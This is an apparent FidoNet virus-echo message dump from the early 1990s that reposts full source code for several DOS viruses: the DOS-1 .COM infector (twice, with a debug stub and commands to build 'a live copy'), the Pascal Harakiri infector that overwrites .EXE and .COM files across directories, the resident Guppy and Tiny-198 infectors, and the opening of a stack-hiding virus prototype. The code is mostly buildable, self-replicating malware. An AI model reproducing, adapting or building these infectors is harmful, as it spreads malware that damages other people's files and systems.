    mov ax,4060     ; Prepare AH for Write
    xor di,di       ; Zero DI
    ret         ; Done

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  FMail 0.96т
 + Origin: This virus is Microsoft Windows (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/A=NNNN       Set NewExe segment alignment factor

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 48 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : DOS_1.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f2f
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Clif Jessop, 2:283/718 (06 Nov 94 16:35)
* To   : Mark Hapershaw
* Subj : DOS_1.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
;DOS1 virus by the TridenT research group - Direct Action appending .COM

;This virus infects .COM files in the current directory using FCB's.
;Other than FCB use, the virus is VERY simple.  Avoids infecting misnamed
;EXE files by using an 'M' at the beginning of files to mark infection.

;This virus requires a stub file made from the following debug script,
;to make it, compile the virus, then create the stub file by removing the
;semicolons from the code between the lines, saving it, and calling it
;vstub.hex.  Then use the following commands:

;               Debug <vstub.hex
;               Copy /b vstub.com+dos1.com virus.com

;And you will have a live copy of the DOS-1 virus.  Please be careful
;with it and do not release it.

;-=-=-=-=-=-=-=-=-=-=-=-=-=Ё[Begin Debug Script]Ё=-=-=-=-=-=-=-=-=-=-=-=-=
;e100 4d eb 6 90 90
;rbx
;0
;rcx
;5
;nvstub.com
;w
;q
;-=-=-=-=-=-=-=-=-=-=-=-=-=Ё[End Debug Script]Ё=-=-=-=-=-=-=-=-=-=-=-=-=

;Disassembly by Black Wolf

.model tiny
.code
        org     100h
start:
        dec     bp
        nop
        int     20h

HostFile:       ;Not present to preserve original compiler offsets.....

Virus_Entry:
        call    GetOffset
Displacement:
db              'DOS-1',0

GetOffset:
        pop     si
        sub     si,offset Displacement-start
        cld

        mov     di,100h
        push    di                      ;Push DI on stack for ret...

        push    si                      ;Restore host file...
        movsw
        movsw

        pop     si
        lea     dx,[si+VirusDTA-start]  ;set DS:DX = DTA
        call    SetDTA
        mov     ax,1100h                ;Find first filename w/FCB's

FindFirstNext:
        lea     dx,[si+SearchString-start]
        int     21h                       ;Find first/next filename
                          ;using FCB's (*.COM)

        or      al,al                   ;Were any .COM files found?
        jnz     ResetDTA                ;No.... exit virus.

        lea     dx,[si+VirusDTA-start]
        mov     ah,0fh
        int     21h                     ;open .COM file w/FCB

        or      al,al                   ;Successful?
        jnz     FindNextFile            ;No - find another.

        push    dx                      ;Push offset of DTA

        mov     di,dx

        mov     word ptr [di+0Eh],1  ;Set bytes per record to 1
        xor     ax,ax
        mov     [di+21h],ax          ;Set Random Record Num to 0
        mov     [di+23h],ax          ;?

        lea     dx,[si]
        call    SetDTA               ;Set DTA to just before virus
                         ;code in memory - Storage bytes..

        lea     dx,[di]              ;DX = Virus DTA
        mov     ah,27h
        mov     cx,4
        int     21h                  ;Read first 4 bytes w/FCB

        cmp     byte ptr [si],'M'    ;Is it an EXE file or infected?
        je      CloseFile            ;exit...

        mov     ax,[di+10h]          ;AX = Filesize
        mov     [di+21h],ax          ;Set current record to EOF

        cmp     ax,0F800h            ;Is file above F800h bytes?
        ja      CloseFile            ;Too large, exit

        push    ax
        lea     dx,[si]
        call    SetDTA               ;Set DTA to storage bytes/virus.

        lea     dx,[di]
        mov     ah,28h
        mov     cx,end_virus-start
        int     21h                  ;Write virus to end of file.

        xor     ax,ax
        mov     [di+21h],ax          ;Reset file to beginning.
        lea     di,[si]              ;Point DI to DTA

        mov     ax,0E94Dh            ;4dh E9h = marker and jump
        stosw
        pop     ax                   ;AX = jump size
        stosw                        ;Put marker and jump into DTA

        push    dx
        lea     dx,[si]
        call    SetDTA               ;Set DTA for write

        pop     dx
        mov     ah,28h
        mov     cx,4
        int     21h                 ;Write in ID byte 'M' and jump

CloseFile:
        pop     dx

        call    SetDTA
        mov     ah,10h
        int     21h                     ;Close file w/FCB

FindNextFile:
        mov     ah,12h
        jmp     short FindFirstNext     ;Find next file...

ResetDTA:
        mov     dx,80h                  ;80h = default DTA
        call    SetDTA
        retn

SetDTA:
        mov     ah,1Ah
        int     21h                     ;Set DTA to DS:DX
        retn

        db       'MK'                   ;Musad Khafir's signature

SearchString:
        db       0                      ;Default Drive
        db       '????????COM'          ;Search for all .COM files.
end_virus:

        org 1d1h
VirusDTA:
end     start

-+-  FMail 0.96т
 + Origin: The Hamburger Haven 1-318-478-9940 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

Trubo Link  Version 4.0 Copyright (c) 1991 Bugland International

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 49 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : DOS1.ASM                                                                
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f38
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Alan Jones, 2:283/718 (06 Nov 94 16:36)
* To   : Dr T.
* Subj : DOS1.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Alan.Jones@f718.n283.z2.fidonet.org
;DOS1 virus by the TridenT research group - Direct Action appending .COM

;This virus infects .COM files in the current directory using FCB's.
;Other than FCB use, the virus is VERY simple.  Avoids infecting misnamed
;EXE files by using an 'M' at the beginning of files to mark infection.

;This virus requires a stub file made from the following debug script,
;to make it, compile the virus, then create the stub file by removing the
;semicolons from the code between the lines, saving it, and calling it
;vstub.hex.  Then use the following commands:

;               Debug <vstub.hex
;               Copy /b vstub.com+dos1.com virus.com

;And you will have a live copy of the DOS-1 virus.  Please be careful
;with it and do not release it.

;-=-=-=-=-=-=-=-=-=-=-=-=-=Ё[Begin Debug Script]Ё=-=-=-=-=-=-=-=-=-=-=-=-=
;e100 4d eb 6 90 90
;rbx
;0
;rcx
;5
;nvstub.com
;w
;q
;-=-=-=-=-=-=-=-=-=-=-=-=-=Ё[End Debug Script]Ё=-=-=-=-=-=-=-=-=-=-=-=-=

;Disassembly by Black Wolf

.model tiny
.code
        org     100h
start:
        dec     bp
        nop
        int     20h

HostFile:       ;Not present to preserve original compiler offsets.....

Virus_Entry:
        call    GetOffset
Displacement:
db              'DOS-1',0

GetOffset:
        pop     si
        sub     si,offset Displacement-start
        cld

        mov     di,100h
        push    di                      ;Push DI on stack for ret...

        push    si                      ;Restore host file...
        movsw
        movsw

        pop     si
        lea     dx,[si+VirusDTA-start]  ;set DS:DX = DTA
        call    SetDTA
        mov     ax,1100h                ;Find first filename w/FCB's

FindFirstNext:
        lea     dx,[si+SearchString-start]
        int     21h                       ;Find first/next filename
                          ;using FCB's (*.COM)

        or      al,al                   ;Were any .COM files found?
        jnz     ResetDTA                ;No.... exit virus.

        lea     dx,[si+VirusDTA-start]
        mov     ah,0fh
        int     21h                     ;open .COM file w/FCB

        or      al,al                   ;Successful?
        jnz     FindNextFile            ;No - find another.

        push    dx                      ;Push offset of DTA

        mov     di,dx

        mov     word ptr [di+0Eh],1  ;Set bytes per record to 1
        xor     ax,ax
        mov     [di+21h],ax          ;Set Random Record Num to 0
        mov     [di+23h],ax          ;?

        lea     dx,[si]
        call    SetDTA               ;Set DTA to just before virus
                         ;code in memory - Storage bytes..

        lea     dx,[di]              ;DX = Virus DTA
        mov     ah,27h
        mov     cx,4
        int     21h                  ;Read first 4 bytes w/FCB

        cmp     byte ptr [si],'M'    ;Is it an EXE file or infected?
        je      CloseFile            ;exit...

        mov     ax,[di+10h]          ;AX = Filesize
        mov     [di+21h],ax          ;Set current record to EOF

        cmp     ax,0F800h            ;Is file above F800h bytes?
        ja      CloseFile            ;Too large, exit

        push    ax
        lea     dx,[si]
        call    SetDTA               ;Set DTA to storage bytes/virus.

        lea     dx,[di]
        mov     ah,28h
        mov     cx,end_virus-start
        int     21h                  ;Write virus to end of file.

        xor     ax,ax
        mov     [di+21h],ax          ;Reset file to beginning.
        lea     di,[si]              ;Point DI to DTA

        mov     ax,0E94Dh            ;4dh E9h = marker and jump
        stosw
        pop     ax                   ;AX = jump size
        stosw                        ;Put marker and jump into DTA

        push    dx
        lea     dx,[si]
        call    SetDTA               ;Set DTA for write

        pop     dx
        mov     ah,28h
        mov     cx,4
        int     21h                 ;Write in ID byte 'M' and jump

CloseFile:
        pop     dx

        call    SetDTA
        mov     ah,10h
        int     21h                     ;Close file w/FCB

FindNextFile:
        mov     ah,12h
        jmp     short FindFirstNext     ;Find next file...

ResetDTA:
        mov     dx,80h                  ;80h = default DTA
        call    SetDTA
        retn

SetDTA:
        mov     ah,1Ah
        int     21h                     ;Set DTA to DS:DX
        retn

        db       'MK'                   ;Musad Khafir's signature

SearchString:
        db       0                      ;Default Drive
        db       '????????COM'          ;Search for all .COM files.
end_virus:

        org 1d1h
VirusDTA:
end     start

-+-  FidoPCB v1.4 [NR]
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

TAZOM Assembler  Version 3.2  Copyright (c) 1988, 1992 Borland International

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 50 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                                               
 Subj : HARAKIRI.PAS                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f3d
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Hans Schotel, 2:283/718 (06 Nov 94 16:36)
* To   : Dr T.
* Subj : HARAKIRI.PAS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Hans.Schotel@f718.n283.z2.fidonet.org
{+--------------------------------------------------------------------+}
{|              Harakiri Virus V1.50        91-09-01                  |}
{| WARNING!! WARNING!! This is a virus, compiled under TP 5.5         |}
{+--------------------------------------------------------------------+}
Uses Dos;
Const Buf_Size=25;
Var
  Buff        : Array[1..5488] of Byte;   { Antal som flyttas per gЖng! }
  DirInfo     : SearchRec;
  Searchfile  : String[20];
  Debug       : Boolean;
{------------------------------------------------------------------------}

Procedure Infect_File (Myfile:String);
Var
  NumRead, NumWritten   : Word;
  FromF, ToF            : File;

Begin
  Assign(FromF,ParamStr(0));            { Open output file }
  Reset(FromF, 1);                      { Record size = 1  }

  If Debug then Writeln (Myfile);
  Assign(ToF,MyFile);                   { Open output file }
  Reset(ToF, 1);                        { Record size = 1  }

  BlockRead(FromF,buff,SizeOf(Buff),NumRead);
  BlockWrite(ToF,buff,NumRead,NumWritten);

  Close(FromF);
  Close(ToF);
End;
{------------------------------------------------------------------}
Function Check_File(Myfile:String) : Boolean;
Var
  NumRead    : Word;
  NumWritten : Word;
  FromF2     : File;
  FromF      : File;
  j2         : Integer;
  j1         : Integer;
  Buf1       : Array[1..Buf_Size] of Byte;   { Antal som flyttas per gЖng! }
  Buf2       : Array[1..Buf_Size] of Byte;   { Antal som flyttas per gЖng! }

Begin
  j2:=1;
  While j2<=Buf_Size do
  begin
    Buf1[j2]:=$20;
    Buf2[j2]:=$20;
    Inc(j2);
  end;
  Check_file := False;

  Assign(FromF, ParamStr(0));      { Open input file  }
  Reset(FromF, 1);               { Record size = 1  }

  Assign (FromF2, Myfile);
  Reset (FromF2, 1);
  If Debug then Write ('--> '); If Debug then Writeln (Myfile);

  BlockRead(FromF,buf1,SizeOf(buf1),NumRead);
  BlockRead(FromF2,buf2,SizeOf(buf2),NumRead);

  j1:=1;
  While j1<=Buf_Size do
  begin
    If Buf1[j1] <> Buf2[j1] then
    begin
       If Debug then Writeln ('Ej Infekterad....!');
       j1:=10000;
       Inc (j1);
       Check_file:=True;
    end;
    Inc (j1);
  end;

  If j1>=9999 then
  begin
    Check_file:=True;
  end;
  Close (FromF); Close (FromF2);
End;

{------------------------------------------------------------------}
Procedure Search_4_File (Sdir: String);

Var
  Dir_save       : Array[1..100] of string [12];
  I,Imax         : Integer;
  Mask           : String[80];
  Attr           : Integer;
  Any_File_found : Boolean;
  New_F          : Boolean;
  Antal_Infected : Integer;

Begin
  Antal_Infected:=0;
  If Debug then Writeln('Sdir = ' ,Sdir);
  Mask := SDir + SearchFile;
  Any_File_found := False;

  FindFirst(Mask, $3F, DirInfo);

  I := 0;

  Begin
    If DosError=0 then
    begin
      I := Length( SDir );
    end;
    I := 0;
    While DosError=0 do
    begin
      If DirInfo.name[1] <> '.' then
      begin
        Any_File_found := true;
        If Debug then Writeln(Dirinfo.name);
        New_F := Check_File (SDir+DirInfo.Name);
        If New_F=True then
        begin
          If Debug then Writeln ('Infecting file');
          Infect_File (Sdir+DirInfo.Name);
          Inc (Antal_Infected);

          If Antal_Infected >= 4 then
          begin
            Writeln ('Program too big to fit in memory');
            Halt;
          end;
          If Debug then Writeln (Antal_Infected);
        end;
        If New_F=False then
        begin
          If Debug then Writeln ('File Already Infected');
        end;
      end;
      FindNext(DirInfo);
    end;  {while}
  End;

  Mask := Sdir + '*.*';
  FindFirst(Mask, Directory, DirInfo);   { look for dir only }
  Imax := 0; I:= 1;

  While DosError=0 do   { GФr lista Фver directories..}
  Begin
    If DirInfo.Attr and Directory <> 0  then
    begin
      If DirInfo.name[1] <> '.' then
      begin
        Dir_save[I] := DirInfo.Name;
        Imax := I; inc(I);
      end;
    end;
    FindNext(DirInfo);
  End;  {while}

  I:=1;
  While I <=  Imax do
  begin
    Search_4_File(SDir + Dir_save[I] + '\');
    I:= I+1;
  end;
End;

{====Main===================================================================}
BEGIN
    Debug          := true;
    SearchFile     := '*.exe';
    Search_4_File ('\');
    SearchFile     := '*.com';
    Search_4_File ('\');

    Writeln ('Your PC is alive and infected with the HARAKIRI virus!');

END.

-+-  GoldED/386 2.50.B1016+
 + Origin: FidoNet * Mathieu NotВris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/A=NNNN       Set NewExe segment alignment factor

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 51 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : GUPPY.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f43
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mikko Hypponen, 2:283/718 (06 Nov 94 16:39)
* To   : Brad Frazee
* Subj : GUPPY.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mikko.Hypponen@f718.n283.z2.fidonet.org
;***************************************************************************
;*                          The Guppy Virus                                *
;*                      Disassembly by Black Wolf                          *
;***************************************************************************
;*      The Guppy virus is a relatively simple, very small, resident .COM  *
;*infector.  It uses the standard way for a regular program to go resident *
;*(i.e. Int 27) which makes the infected program terminate the first time  *
;*run.  After that, however, infected files will run perfectly.  This virus*
;*uses interesting methods to restore the storage bytes, as well as a      *
;*strange technique to restore control to an infected file after it has    *
;*already gone memory resident.                                            *
;*                                                                         *
;*Note: The Guppy virus was originally assembled with an assembler other   *
;*      than Tasm, so to keep it exactly the same some commands must be    *
;*      entered directly as individual bytes.  In these cases, the command *
;*      is commented out and the bytes are found below it.                 *
;*                                                                         *
;***************************************************************************

.model tiny
.radix 16
.code

        org     100h
start:
        call    Get_Offset

Get_Offset:
        pop     si                 ;SI = offset of vir +
                       ;(Get_Offset-Start)
        mov     ax,3521h
        mov     bx,ax
        int     21h                ;Get Int 21 Address

        mov     ds:[si+Int_21_Offset-103],bx      ;Save old Int 21
        mov     ds:[si+Int_21_Segment-103],es

        ;mov     dx,si             ;Bytes vary between assemblers
        db      89,0f2

        ;add     dx,offset Int_21_Handler-104
        db      83,0c2,1f

        mov     ah,25h
        int     21h                ;Set Int 21

        inc     dh                 ;Add 100h bytes to go resident
                       ;from handler
        push    cs
        pop     es
        int     27h                ;Terminate & stay resident


Int_21_Handler:
        cmp     ax,4B00h           ;Is call a Load & Execute?
        je      Infect             ;Yes? Jump Infect

        cmp     al,21h             ;Might it be a residency check?
        jne     Go_Int_21          ;No? Restore control to Int 21

        ;cmp     ax,bx             ;Are AX and BX the same?
        db      39,0d8

        jne     Go_Int_21          ;No, Restore control to Int 21

        push    word ptr [si+3dh]  ;3dh = offset of Storage_Bytes -
                       ;Get_Offset

                       ;This gets the first word of
                       ;storage bytes, which is then
                       ;popped to CS:100 to restore it.

        mov     bx,offset ds:[100] ;100 = Beginning of COM
        pop     word ptr [bx]

        mov     cl,[si+3Fh]        ;Restore third storage byte.
        mov     [bx+2],cl

Restore_Control:
        pop     cx
        push    bx
        iret                            ;Jump back to Host program.

Storage_Bytes         db      0, 0, 0

Infect:
        push    ax
        push    bx
        push    dx
        push    ds
        mov     ax,3D02h
        int     21h             ;Open File for Read/Write Access

        xchg    ax,bx
        call    Get_Offset_Two

Get_Offset_Two:
        pop     si
        push    cs
        pop     ds
        mov     ah,3F
        mov     cx,3
        sub     si,10           ;Set SI=Storage_Bytes

        ;mov     dx,si
        db      89,0f2

        int     21h             ;Read first 3 bytes of file

        cmp     byte ptr [si],0E9h      ;Is the first command a jump?
        jne     Close_File                   ;No? Jump to Close_File
        mov     ax,4202h
        xor     dx,dx
        xor     cx,cx
        int     21h                     ;Go to end of file

        xchg    ax,di
        mov     ah,40h
        mov     cl,98h                  ;Virus Size

        ;mov     dx,si
        db      89,0f2

        sub     dx,40h                  ;Beginning of virus
        int     21h                     ;Append virus to new host

        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        int     21h                     ;Go back to beginning of file

        mov     cl,3

        ;sub     di,cx
        db      29,0cf

        mov     [si+1],di
        mov     ah,40h

        ;mov     dx,si
        db      89,0f2

        int     21h                     ;Write 3 byte jump to file

Close_File:
        mov     ah,3Eh
        int     21h

        pop     ds
        pop     dx
        pop     bx
        pop     ax
Go_Int_21:
        db      0EAh                    ;Go On With Int 21
Int_21_Offset   dw      ?
Int_21_Segment  dw      ?

end     start

-+-  UC2 Support France
 + Origin: NETTIS Public Acces Internet (603)432-2517 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/d            Warn if duplicate symbols in libraries

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 52 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : TINY_198.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f4c
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mikko Hypponen, 2:283/718 (06 Nov 94 16:40)
* To   : Gilbert Holleman
* Subj : TINY_198.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mikko.Hypponen@f718.n283.z2.fidonet.org
    page    ,132
    name    TINY198
    title   The 'Tiny' virus, version TINY-198
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·          The 'Tiny' Virus, version TINY-198                  ·
; ·         Disassembled by Vesselin Bontchev, July 1990         ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

seg_60  equ 600
v_len   equ v_end-v_entry

start:
    jmp v_entry     ; Jump to virus code
    db  'M'             ; Virus signature
    mov ax,4C00     ; Program terminate
    int 21

v_entry:
    call    self        ; Determine the start addres of the virus body
self:
    pop si
    sub si,3

    push    ax      ; Save AX (to keep programs as DISKCOPY happy)

; Check whether the virus is already in memory and just run the program if so:

    mov ah,0E9
    int 21

    mov di,seg_60   ; Point ES:DI at 0000:0600h (i.e, segment 60h)
    xor cx,cx       ; ES := 0
    mov es,cx
    mov cl,v_len    ; CX := virus length
    rep movsb       ; Move the virus body there

; Transfer control to cont: by PUSHing its address
; on the stack and executing RETF:

    push    es
    mov ax,cont-v_entry+seg_60
    push    ax
    retf

; The original first 4 bytes of the infected file:

first4  db  0EBh, 2, 90, 90

; Resume execution from here (but already in segment 60h):

cont:

; Install new INT 21h handler and move the old one at INT 32h:

    mov di,21*4
    mov cl,2
    mov ax,int_21-v_entry+seg_60
    cld
lp:
    push    word ptr es:[di]    ; Get old handler's address
    pop word ptr es:[di+(32-21)*4]  ; Move it at INT 32h
    stosw           ; Install the new one
    mov ax,cs
    loop    lp      ; Loop until done

; Save the original first 4 bytes of the infected program on the stack:

    push    word ptr cs:[first4-v_entry+seg_60]
    push    word ptr cs:[first4+2-v_entry+seg_60]

run_pgm:
    mov di,offset start ; Point DI at program's start
    pop word ptr [di+2] ; Restore the first 4 bytes of the program
    pop word ptr [di]
    pop ax      ; Restore the original value of AX
    push    ds
    push    ds      ; ES := DS
    pop es
    push    di      ; Push 100h on the stack
    retf

mem_chk:

; Push the original first 4 bytes of the infected program on the stack:

    push    word ptr [si+first4-v_entry]
    push    word ptr [si+first4+2-v_entry]
    jmp run_pgm     ; And run the original program

int_21:             ; New INT 21h handler
    cmp ah,0E9      ; Memory check?
    je  mem_chk     ; If infected, run the original program
    cmp ax,4B00     ; EXEC function call?
    jne end_21      ; Exit if not

    push    ax      ; Save registers used
    push    bx
    push    cx
    push    dx
    push    di
    push    ds
    push    es

    push    cs      ; ES := CS
    pop es

    mov ax,3D02     ; Open the file for both reading and writting
    int 32
    jc  end_exec    ; Exit on error
    mov bx,ax       ; Save the file handle in BX

    mov ah,3F       ; Read the first 4 bytes of the file
    mov cx,4        ; 4 bytes to read
    mov dx,first4-v_entry+seg_60    ; Put them in first4
    mov di,dx       ; Save first4 address in DI
    push    cs      ; DS := CS
    pop ds
    int 32      ; Do it

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

    push    di      ; Save DI
    mov al,'M'          ; Look for `M'
    repne   scasb
    pop di      ; Restore DI
    je  close       ; Exit if file not suitable for infection

    mov ax,4202     ; Seek to the end of file
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    push    ax      ; Save file length

    mov dh,6        ; DX = 600h, i.e. point it at 0000:0600h
    mov cl,v_len    ; Length of virus body
    mov ah,40       ; Append virus to file
    int 32      ; Do it

    mov ax,4200     ; Seek to the file beginning
    xor cx,cx
    xor dx,dx
    int 32      ; Do it

    mov dx,di       ; Point DX at first4
    mov al,0E9      ; Near JMP opcode
    stosb           ; Form the first instruction of the file
    pop ax      ; Restore file length in AX
    sub ax,3        ; Subtract 3 (first instruction length)
    stosw           ; Form the JMP's opperand
    mov al,'M'          ; Add a `M' character to mark the file
    stosb           ;  as infected

    mov cl,4        ; Overwrite the first 4 bytes of the file
    mov ah,40
    int 32      ; Do it

close:
    mov ah,3E       ; Close the file
    int 32

end_exec:
    pop es      ; Restore used registers
    pop ds
    pop di
    pop dx
    pop cx
    pop bx
    pop ax

; Exit through the original INT 21h handler:

end_21:
    jmp dword ptr cs:[32*4]

v_end   equ $       ; End of virus body

code    ends
    end start

-+-  FMail 0.96т
 + Origin: This virus is Microsoft Windows (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/iPATH        Search PATH for include files

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 53 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : STACKVIR.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f57
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 16:43)
* To   : Edwin Cleton
* Subj : STACKVIR.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
;▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
;▒                                        ▒
;▒          V I R U S   P R O T O T Y P E                 ▒
;▒                                        ▒
;▒   Author : Waleri Todorov, CICTT, (C)-Copyright 1991, All Rights Rsrvd ▒
;▒   Date   : 25 Jan 1991    21:05                        ▒
;▒   Function   : Found DOS stack in put himself in it. Then trace DOS        ▒
;▒        function EXEC and type 'Infect File'                        ▒
;▒                                        ▒
;▒                                        ▒
;▒   If you want to have fun with this program just run file STACK.COM    ▒
;▒  Don't worry, this is not a virus yet, just try to find him in memory      ▒
;▒  with PCTools and/or MAPMEM. If you can -> just erase the source - it is   ▒
;▒  useless for you. If you can't -> you don't have to look at it - it is too ▒
;▒  difficult to you to understand it.                        ▒
;▒                       Best regards, Waleri Todorov     ▒
;▒                                        ▒
;▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒




        mov ah,52h      ; Get DOS segmenty
        int 21h

        cmp ax,1234h    ; Also check for already here
        jne Install     ; If not -> install in memory
ReturnControl

        int 20h     ; This program will give control
                    ; to main file
Install
        mov ax,es       ; mov DOS segment in AX
